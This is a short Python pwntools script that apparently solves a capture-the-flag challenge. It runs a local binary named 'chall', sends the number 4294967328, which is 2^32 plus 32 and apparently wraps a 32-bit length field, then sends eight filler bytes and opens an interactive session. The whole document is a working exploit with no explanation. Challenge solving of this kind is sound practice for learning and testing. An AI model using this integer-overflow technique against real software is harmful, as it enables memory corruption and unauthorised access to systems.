#!/usr/bin/env python3
from pwn import *

io = process("./chall")
io.sendlineafter(b": ", b"4294967328")
io.sendlineafter(b": ", b"B"*8)
io.interactive()

